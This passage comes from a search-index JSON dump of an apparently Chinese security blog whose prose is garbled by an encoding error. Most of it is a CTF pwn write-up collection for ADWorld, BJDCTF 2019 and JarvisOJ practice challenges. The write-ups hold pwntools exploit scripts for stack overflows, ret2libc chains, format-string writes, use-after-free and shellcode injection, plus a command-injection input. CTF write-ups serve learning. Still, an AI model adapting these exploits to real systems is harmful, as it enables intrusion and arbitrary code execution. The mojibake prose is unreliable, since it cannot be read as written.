ä¸ºä¹‹å‰å·²ç»æœ‰ï¼š from CTFd.utils.dates import unix_time_to_utc ","date":"2020-02-09","objectID":"/h1ve-deploy/:3:2","tags":["Docker"],"title":"æ…é©¬èœ‚çªï¼šH1ve éƒ¨ç½²å®è·µ","uri":"/h1ve-deploy/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"è¿‘æœŸåšçš„ä¸€äº›ç®€å• Pwn é¢˜è®°å½•ã€‚é¢˜ç›®æ¥è‡ª ADWorld æ–°æ‰‹åŒºã€BJDCTF 2019ã€JarvisOJã€‚ ","date":"2020-02-03","objectID":"/recent-pwn-simple/:0:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ADWorld æ–°æ‰‹åŒº ","date":"2020-02-03","objectID":"/recent-pwn-simple/:1:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"level2 åŸºæœ¬çš„æ ˆæº¢å‡ºåˆ° system åœ°å€éšåä¼ å…¥ /bin/sh åœ°å€ï¼Œåè€…å¯é€šè¿‡ ROPgadget æœç´¢åˆ°ã€‚ ru('Input:\\n') binsh = 0x804a024 payload = flat('a'*(0x88+4),elf.plt['system'],'a'*4, binsh) sl(payload) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:1:1","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"guess_num __int64 __fastcall main(__int64 a1, char **a2, char **a3) { int v4; // [rsp+4h] [rbp-3Ch] int i; // [rsp+8h] [rbp-38h] int v6; // [rsp+Ch] [rbp-34h] char v7; // [rsp+10h] [rbp-30h] unsigned int seed[2]; // [rsp+30h] [rbp-10h] unsigned __int64 v9; // [rsp+38h] [rbp-8h] v9 = __readfsqword(0x28u); setbuf(stdin, 0LL); setbuf(stdout, 0LL); setbuf(stderr, 0LL); v4 = 0; v6 = 0; *(_QWORD *)seed = sub_BB0(); puts(\"-------------------------------\"); puts(\"Welcome to a guess number game!\"); puts(\"-------------------------------\"); puts(\"Please let me know your name!\"); printf(\"Your name:\", 0LL); gets(\u0026v7); srand(seed[0]); for (i = 0; i \u003c= 9; ++i) { v6 = rand() % 6 + 1; printf(\"-------------Turn:%d-------------\\n\", (unsigned int)(i + 1)); printf(\"Please input your guess number:\"); __isoc99_scanf(\"%d\", \u0026v4); puts(\"---------------------------------\"); if (v4 != v6) { puts(\"GG!\"); exit(1); } puts(\"Success!\"); } sub_C3E(); return 0LL; } ä½¿ç”¨äº† srand ç”Ÿæˆéšæœºç§å­ï¼Œä½†æ˜¯å‚æ•° seed å¯ä»¥è¢« v7 è¦†ç›–ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦æ§åˆ¶ seed[0] å³å¯é¢„æµ‹äº§ç”Ÿçš„éšæœºæ•°ä»è€Œè¿›å…¥ sub_C3E åé—¨å‡½æ•°ã€‚ ru('name:') payload = flat('a'*0x20, 0) sl(payload) from ctypes import * libc = cdll.LoadLibrary(\"/lib/x86_64-linux-gnu/libc.so.6\") libc.srand(0) for i in range(10): sla('number:', libc.rand()%6+1) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:1:2","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"int_overflow æœ¬é¢˜åªèƒ½ loginï¼Œå¹¶è¾“å…¥ç”¨æˆ·åå¯†ç ï¼Œéšåè¿›å…¥ check_passwd å‡½æ•°éªŒè¯ï¼š char *__cdecl check_passwd(char *s) { char *result; // eax char dest; // [esp+4h] [ebp-14h] unsigned __int8 v3; // [esp+Fh] [ebp-9h] v3 = strlen(s); if (v3 \u003c= 3u || v3\u003e 8u ) { puts(\"Invalid Password\"); result = (char *)fflush(stdout); } else { puts(\"Success\"); fflush(stdout); result = strcpy(\u0026dest, s); } return result; } æ³¨æ„åˆ°è¿™é‡Œæˆ‘ä»¬å¸Œæœ›è¿›å…¥ else è¯­å¥ï¼Œå°†è¾“å…¥çš„ s å¤åˆ¶åˆ° dest æ‰€åœ¨åœ°å€å¤„é€ æˆæ ˆæº¢å‡ºã€‚ä½†æ˜¯è¿™è¦æ±‚ s çš„é•¿åº¦å¤§äº 3 ä¸”å°äº 8ï¼Œè¿™ä¸ªé•¿åº¦å¤ªçŸ­äº†ã€‚å› æ­¤ç»“åˆé¢˜åè€ƒè™‘æ•´æ•°æº¢å‡ºï¼šè¿™é‡Œçš„ v3 æ˜¯æ— ç¬¦å·çš„ 8 ä½æ•´æ•°ï¼Œé‚£ä¹ˆå½“å­—ç¬¦ä¸²é•¿åº¦å®é™…ä¸Šåªéœ€è¦æ¨¡ 255 çš„ç»“æœå¤§äº 3 å°äº 8 å³å¯ã€‚æœ€åè¿”å›åˆ°åé—¨å‡½æ•°ã€‚ ru('choice:') sl('1') ru('username:\\n') sl('aaa') ru('passwd:\\n') payload = flat('a'*(0x14+4),elf.sym['what_is_this']) sl(payload.ljust(260,'a')) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:1:3","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"cgpwn2 æœ¬é¢˜æä¾›äº†ä¸€ä¸ª bss æ®µçš„å¯å†™çš„ name å­—ç¬¦ä¸²æ•°ç»„ï¼Œæ˜¾ç„¶å°±æ˜¯è¦æˆ‘ä»¬å‘å…¶ä¸­å†™å…¥ /bin/shï¼Œç„¶åé€šè¿‡æº¢å‡ºè°ƒç”¨ system(\"/bin/sh\")ã€‚ ru('name\\n') sl('/bin/sh') ru('here:\\n') payload = flat('a'*(0x26+4),elf.plt['system'],'a'*4,0x804a080) sl(payload) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:1:4","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"when_did_you_born è¿™é¢˜è¦æ±‚è¾“å…¥çš„ç”Ÿæ—¥å¹´ä»½ v5 ä¸èƒ½ç­‰äº 1926ï¼Œä½†æ˜¯ä¹‹ååˆè¦æ±‚ v5 ç­‰äº 1926ï¼Œä¸¤è€…ä¹‹é—´å­˜åœ¨ä¸€ä¸ª get(\u0026v4) çš„æ“ä½œï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°é€šè¿‡æº¢å‡º v4 æ¥ä¿®æ”¹ v5 çš„å€¼ã€‚ ru('Birth?\\n') sl('1900') ru('Name?\\n') payload = flat('a'*0x8,1926) sl(payload) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:1:5","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"hello_pwn ç›´æ¥è®¡ç®—å¾—åˆ°åç§»é‡ä¸º 4 å¹¶æº¢å‡ºä¸ºæŒ‡å®šå€¼å³å¯ï¼Œæ²¡æœ‰éš¾åº¦ã€‚ ru('bof\\n') payload = flat('a'*4,0x6e756161) sl(payload) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:1:6","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"level3 åŸºç¡€çš„ ret2libcï¼Œæ³¨æ„åŠ è½½é¢˜ç›®ç»™å®šçš„ libcã€‚ ru('Input:\\n') payload = flat('a'*(0x88+4),elf.plt['write'],elf.sym['main'],1,elf.got['write'],0x4) sl(payload) write = uu32(r(4)) leak('write',write) base = write - libc.sym['write'] system = base + libc.sym['system'] binsh = base + libc.search('/bin/sh').next() ru('Input:\\n') payload = flat('a'*(0x88+4),system,'a'*4,binsh) sl(payload) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:1:7","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"string è·Ÿç€å‰§æƒ…èµ°ä¸€éå¤§æ¦‚å¯ä»¥çŸ¥é“å¯ä»¥é€‰çš„é€‰é¡¹ä»¥åŠæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´çš„å­˜åœ¨ã€‚æŸ¥çœ‹ä»£ç å¯ä»¥éªŒè¯æ¼æ´ï¼Œå…³é”®æ˜¯å¦‚ä½•åˆ©ç”¨ã€‚ æˆ‘ä»¬åœ¨è§’è‰²æ­»äº¡çš„å‡½æ•°å‘ç°äº†ä¸€ä¸ªåˆ†æ”¯ï¼š unsigned __int64 __fastcall sub_400CA6(_DWORD *a1) { void *v1; // rsi unsigned __int64 v3; // [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u); puts(\"Ahu!!!!!!!!!!!!!!!!A Dragon has appeared!!\"); puts(\"Dragon say: HaHa! you were supposed to have a normal\"); puts(\"RPG game, but I have changed it! you have no weapon and\"); puts(\"skill! you could not defeat me !\"); puts(\"That's sound terrible! you meet final boss!but you level is ONE!\"); if (*a1 == a1[1] ) { puts(\"Wizard: I will help you! USE YOU SPELL\"); v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL); read(0, v1, 0x100uLL); ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1); } return __readfsqword(0x28u) ^ v3; } è¿™é‡Œæ˜¾ç„¶æ˜¯éœ€è¦ç”¨åˆ°å·«å¸ˆçš„æ³•æœ¯ï¼Œä¹Ÿå°±æ˜¯è¯´å’Œå¼€å¤´çš„ secret æœ‰å…³ã€‚å½“ *a1 == a1[1] æ—¶ä¼šè§¦å‘å¹¶ä»ç”¨æˆ·è¾“å…¥è¯»å– v1ï¼Œéšåç›´æ¥å½“ä½œä»£ç æ‰§è¡Œï¼Œé‚£ä¹ˆè¿™é‡Œåº”è¯¥æ˜¯éœ€è¦ shellcodeã€‚è€Œ a1 æ¥è‡ªäº main å‡½æ•°ä¸­çš„ v4ï¼š __int64 __fastcall main(__int64 a1, char **a2, char **a3) { _DWORD *v3; // rax __int64 v4; // ST18_8 setbuf(stdout, 0LL); alarm(0x3Cu); sub_400996(60LL, 0LL); v3 = malloc(8uLL); v4 = (__int64)v3; *v3 = 68; v3[1] = 85; puts(\"we are wizard, we will give you hand, you can not defeat dragon by yourself ...\"); puts(\"we will tell you two secret ...\"); printf(\"secret[0] is %x\\n\", v4, a2); printf(\"secret[1] is %x\\n\", v4 + 4); puts(\"do not tell anyone\"); sub_400D72(v4); puts(\"The End.....Really?\"); return 0LL; } è€Œ v4 å®é™…ä¸Šå°±æ˜¯ v3ï¼Œé‚£ä¹ˆè¿™é‡Œå°† v3[0] æ”¹ä¸º 85 å³å¯ã€‚è€Œå·«å¸ˆç»™æˆ‘ä»¬çš„ secret[0] æ°å¥½å°±æ˜¯æˆ‘ä»¬éœ€è¦çš„ v3[0] çš„åœ°å€ï¼Œæˆ‘ä»¬æŠŠè¿™ä¸ªåœ°å€è¾“å…¥åˆ° Give me an address åï¼Œç„¶ååœ¨ wish å¤„è¾“å…¥æ ¼å¼åŒ–å­—ç¬¦ä¸²ã€‚é¦–å…ˆç”±äºéœ€è¦ %n å†™å…¥ï¼Œæˆ‘ä»¬å…ˆè¾“å‡º 85 ä¸ªå­—ç¬¦å³ %85cï¼Œéšåè¦æµ‹å‡ºåç§»ï¼Œå¯ä»¥é€šè¿‡ aaaa%p.%p. è¿™ç§å½¢å¼çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æµ‹å‡ºåç§»ä¸º 7ã€‚å› æ­¤æœ€ç»ˆæ„é€ çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸º %85c%7$nã€‚ ru('secret[0] is ') addr = int(ru('\\n'), 16) sla('name be:\\n', 'merc') sla('up?:\\n', 'east') sla('(0)?:\\n','1') sla(\"address'\\n\", str(addr)) sla('is:\\n', '%85c%7$n') ru('SPELL\\n') sl(asm(shellcraft.sh())) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:1:8","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"getshell nc ç›´è¿ã€‚ ","date":"2020-02-03","objectID":"/recent-pwn-simple/:1:9","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"CGfsb åŒæ ·æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œç›¸æ¯” string é‚£é¢˜è¦ç®€å•ä¸å°‘ï¼Œåªéœ€è¦è®©å…¨å±€å˜é‡ pwnme ä¸º 8ï¼Œåœ°å€å¯ç›´æ¥ IDA å¾—åˆ°ï¼Œåç§»é‡åŒæ ·é€šè¿‡ aaaa%p.%p. æµ‹å‡ºã€‚ä¸ºæ­¤æ„é€ å­—ç¬¦ä¸² pwnme åœ°å€ + %4c%10$nï¼Œ%4c æ˜¯ä¸ºäº†è®©å·²æ‰“å°å­—ç¬¦å‡‘è¶³ 8 ä¸ªã€‚ pwnme = 0x804a068 sla('name:\\n', 'merc') sla('please:\\n', p32(pwnme) + '%4c%10$n') ","date":"2020-02-03","objectID":"/recent-pwn-simple/:1:10","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"BJDCTF2019 ","date":"2020-02-03","objectID":"/recent-pwn-simple/:2:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"babyrouter è¯»å…¥ ip åœ°å€å¹¶æ²¡æœ‰è¿‡æ»¤å°±ä½œä¸º system çš„å‚æ•°ã€‚å› æ­¤ç›´æ¥æ„é€  1; cat flag å³å¯ã€‚ ","date":"2020-02-03","objectID":"/recent-pwn-simple/:2:1","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"babystack ret2text æ¨¡æ¿é¢˜ã€‚ sla('name:\\n','1000') payload = flat('a'*0x18,elf.sym['backdoor']) sla('name?\\n', payload) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:2:2","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"babyrop ret2libc æ¨¡æ¿é¢˜ã€‚ pop_rdi = 0x400733 payload = flat('a'*0x28,pop_rdi,elf.got['read'],elf.plt['puts'],elf.sym['vuln']) ru('story!\\n') sl(payload) read = uu64(r(6)) leak('read',read) system,binsh = ret2libc(read,'read') payload = flat('a'*0x28,pop_rdi,binsh,system,'a'*8) sla('story!\\n',payload) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:2:3","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"babystack2 æœ¬é¢˜åœ¨ babystack çš„åŸºç¡€ä¸Šï¼Œé™åˆ¶äº†è¾“å…¥çš„é•¿åº¦ï¼š if ((signed int)nbytes \u003e 10 ) { puts(\"Oops,u name is too long!\"); exit(-1); } æ³¨æ„åˆ°è¿™é‡Œä»…ä»…åˆ¤æ–­äº†å¤§äºï¼Œè€Œä¸”ä¼šå¼ºåˆ¶ç±»å‹è½¬æ¢ä¸ºæœ‰ç¬¦å·æ•°ï¼Œè€ŒåŸæ¥çš„ nbytes æ˜¯æ— ç¬¦å·çš„ï¼Œå› æ­¤å¯ä»¥æ•´æ•°æº¢å‡ºç»•è¿‡ã€‚ sla('name:\\n','-1') payload = flat('a'*0x18,elf.sym['backdoor']) sla('name?\\n', payload) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:2:4","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"babyrop2 æœ¬é¢˜åœ¨ babyrop çš„åŸºç¡€ä¸Šå¢åŠ äº† canaryï¼Œé‚£ä¹ˆæ³„éœ² canary å³å¯ã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œæ— ç–‘éœ€è¦æ–°å¢å‡½æ•° gift çš„å¸®åŠ©ã€‚åœ¨è¯¥å‡½æ•°ä¸­æ˜æ˜¾å­˜åœ¨ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚ é€šè¿‡åå¤ %2$pï¼Œ%3$p å¯çŸ¥ canary åœ¨ç¬¬ 7 ä¸ªï¼Œè¿™å¯ä»¥é€šè¿‡å…¶é•¿åº¦ 8 å­—èŠ‚ä»¥åŠæœ«å°¾çš„ 00 å­—èŠ‚åˆ¤æ–­ã€‚ç„¶åä»æ±‡ç¼–ä¸­å¯çŸ¥ canary ä½äº ebp-0x10 å¤„ï¼Œå¡«å…¥é€‚å½“ä½ç½®å³å¯ã€‚ sla('u!\\n','%7$p') ru('0x') canary = int(r(16),16) leak('canary', canary) pop_rdi = 0x400993 payload = flat('a'*0x18,canary,'a'*8,pop_rdi,elf.got['read'],elf.plt['puts'],elf.sym['vuln']) ru('story!\\n') sl(payload) read = uu64(r(6)) leak('read',read) system,binsh = ret2libc(read,'read') payload = flat('a'*0x18,canary,'a'*8,pop_rdi,binsh,system,'a'*8) sla('story!\\n',payload) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:2:5","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"encrypted_stack é€†å‘é¢˜ï¼Œsub_400a70 å¤„å­˜åœ¨æ±‚é€†å…ƒå‡½æ•°ï¼Œè¯´æ˜é¢˜ç›®å¯èƒ½ä½¿ç”¨äº† RSA åŠ å¯†ï¼Œæˆ‘ä»¬çš„ä»»åŠ¡å°±æ˜¯æ‰¾åˆ°ç§é’¥ç„¶åå¯¹é¢˜ç›®äº§ç”Ÿçš„éšæœºæ•°è¿›è¡Œè§£å¯†ï¼Œå¾ªç¯ 20 æ¬¡åå³å¯é€šè¿‡éªŒè¯ï¼Œæœ€å ret2libcã€‚åœ¨ main ä¸­å¯ä»¥å‘ç°å¦‚ä¸‹è¯­å¥ï¼š v7 = qword_602098; v8 = qword_602090; çŒœæµ‹æ˜¯ RSA çš„ e å’Œ Nï¼ŒæŸ¥çœ‹åå‘ç° e=0x10001, N=0x150013E8C603B57ã€‚è¿™ä¸ª N æ˜¾ç„¶å®¹æ˜“åˆ†è§£ï¼Œä»è€Œå¾—åˆ°ç§é’¥ã€‚ N = 94576960329497431 d = 26375682325297625 def powmod(a, b, m): if a == 0: return 0 if b == 0: return 1 res = powmod(a,b//2,m) res *= res res %= m if b\u00261: res *= a res %= m return res def ans(): global ru,sl ru(\"it\\n\") for i in range(20): c = int(ru('\\n')) m = powmod(c, d, N) sl(str(m)) ru('\\n') ans() ru('name:\\n') pop_rdi = 0x40095a welcome = 0x400b30 payload = flat('a'*0x48,pop_rdi,elf.got['read'],elf.plt['puts'],welcome) sl(payload) read = uu64(r(6)) leak('read',read) system,binsh = ret2libc(read,'read') payload = flat('a'*0x48,pop_rdi,binsh,system) sl(payload) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:2:6","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"YDSneedGirlfriend æœ¬é¢˜åœ¨åˆ é™¤æ—¶æ²¡æœ‰å°†æŒ‡é’ˆç½®ç©ºï¼Œå­˜åœ¨ uafã€‚è€Œ girlfriend ç»“æ„ä½“ç”±ä¸€ä¸ªæ‰“å°åå­—çš„å‡½æ•°å’Œå­˜å‚¨åå­—çš„ char æ•°ç»„æ„æˆï¼Œæˆ‘ä»¬å¸Œæœ›èƒ½å°†è¯¥å‡½æ•°æŒ‡å‘ç¨‹åºä¸­å·²ç»å­˜åœ¨çš„ backdoor å‡½æ•°ã€‚éœ€è¦æ³¨æ„ 64 ä½ä¸‹æœ€å°‘åˆ†é… 0x20 å­—èŠ‚ï¼Œè€Œ add(0x20) ä¼šåˆ†é… 0x30 å­—èŠ‚ã€‚è¿™ç¡®ä¿äº†åœ¨ add(0x8) æ—¶ï¼Œå…ˆè¢«åˆ†é…åˆ°çš„æ˜¯ girlfriend1 çš„å‡½æ•°æŒ‡é’ˆï¼Œç„¶åæ˜¯ girlfriend0 çš„å‡½æ•°æŒ‡é’ˆã€‚ def add(size,name='a'): sla(':','1') sla(':',str(size)) sla(':',name) def delete(index): sla(':','2') sla(':',str(index)) def show(index): sla(':','3') sla(':',str(index)) add(0x20) add(0x20) delete(0) delete(1) add(0x8,p64(elf.sym['backdoor'])) show(0) æœ¬é¢˜å’Œ hitcontraining_uaf ç±»ä¼¼ï¼Œä¸è¿‡åè€…æ˜¯ 32 ä½çš„ã€‚ def add(size,name='a'): sla(':','1') sla(':',str(size)) sla(':',name) def delete(index): sla(':','2') sla(':',str(index)) def show(index): sla(':','3') sla(':',str(index)) add(0x10) add(0x10) delete(0) delete(1) add(0x8,p32(elf.sym['magic'])) show(0) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:2:7","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"JarvisOJ ","date":"2020-02-03","objectID":"/recent-pwn-simple/:3:0","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"level0 ret2textã€‚ payload = flat('a'*0x88,elf.sym['callsystem']) sla('World\\n', payload) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:3:1","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"level1 é¢˜ç›®ç»™å‡ºäº† buf çš„çœŸå®åœ°å€ï¼Œä¸” buf å¯ä»¥è¾“å…¥ 0x100 å­—èŠ‚ï¼Œé‚£ä¹ˆå¯ä»¥åœ¨ buf ä¸­å†™ shellcode ç„¶åè¿”å›åˆ° bufã€‚ ru('0x') buf = int(ru('?'),16) leak('buf', buf) payload = asm(shellcraft.sh()).ljust(0x88+4,'a') + p32(buf) sl(payload) ä½†æ˜¯æœ¬é¢˜è¿œç¨‹æ–‡ä»¶å‡ºäº†ç‚¹é—®é¢˜å¯¼è‡´æ‹¿ä¸åˆ° buf çš„çœŸå®åœ°å€ï¼Œæ‰€ä»¥æ¢äº†ç§åŠæ³•ï¼Œè°ƒç”¨ read æŠŠ shellcode è¯»å–åˆ° bss æ®µä¸Šï¼Œç„¶åè¿”å›åˆ° bss æ®µ getshellã€‚ pop3 = 0x8048549 payload = flat('a'*(0x88+4),elf.plt['read'],pop3,0,elf.bss(),0x100,elf.bss()) sl(payload) sl(asm(shellcraft.sh())) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:3:2","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"level2 æœ¬é¢˜ä¸­å­˜åœ¨ system å‡½æ•°ï¼Œé€šè¿‡ ROPgadgets æœç´¢åˆ°äº† binsh å­—ç¬¦ä¸²ï¼Œæ„é€ è°ƒç”¨ system(\"/bin/sh\") å³å¯ã€‚ binsh = 0x804a024 payload = flat('a'*(0x88+4),elf.plt['system'],'a'*4,binsh) sla('Input:\\n',payload) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:3:3","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"level2_x64 ä¸Šä¸€é¢˜çš„ 64 ä½ç‰ˆæœ¬ï¼Œéœ€è¦é€šè¿‡ pop rdi; ret çš„ gadget ä¼ å‚ã€‚ pop_rdi = 0x4006b3 binsh = 0x600a90 payload = flat('a'*(0x80+8),pop_rdi,binsh,elf.plt['system']) sla('Input:\\n',payload) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:3:4","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"level3 æ²¡æœ‰ system å’Œ binsh ä½†æœ‰ libcï¼Œå› æ­¤å¸¸è§„ ret2libcã€‚ payload = flat('a'*(0x88+4),elf.plt['write'],elf.sym['main'],1,elf.got['read'],4) ru('Input:\\n') sl(payload) read =uu64(r(4)) leak('read',read) system,binsh = ret2libc(read,'read') payload = flat('a'*(0x88+4),system,'a'*4,binsh) sla('Input:\\n',payload) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:3:5","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"level3_x64 \u0026 level5 ä¸Šé¢˜çš„ 64 ä½ç‰ˆæœ¬ï¼Œä¾ç„¶éœ€è¦å¯„å­˜å™¨ä¼ å‚ã€‚ pop_rdi = 0x4006b3 pop_rsi_r15 = 0x4006b1 payload = flat('a'*(0x80+8),pop_rdi,1,pop_rsi_r15,elf.got['read'],6,elf.plt['write'],elf.sym['main']) ru('Input:\\n') sl(payload) read =uu64(r(6)) leak('read',read) system,binsh = ret2libc(read,'read') payload = flat('a'*(0x80+8),pop_rdi,binsh,system) sla('Input:\\n',payload) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:3:6","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn åˆé›†","uri":"/recent-pwn-simple/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"level4 å’Œ level3 å‡ ä¹ç›¸åŒï¼Œä¾ç„¶æ˜¯ ret2libcã€‚ payload = flat('a'*(0x88+4),elf.plt['write'],elf.sym['main'],1,elf.got['read'],4) sl(payload) read =uu64(r(4)) leak('read',read) system,binsh = ret2libc(read,'read') payload = flat('a'*(0x88+4),system,'a'*4,binsh) sl(payload) ","date":"2020-02-03","objectID":"/recent-pwn-simple/:3:7","tags":["æ•´æ•°æº¢å‡º","æ ˆæ¼æ´","fsb","å †æ¼æ´","RSA"],"title":"è¿‘æœŸç®€å• Pwn 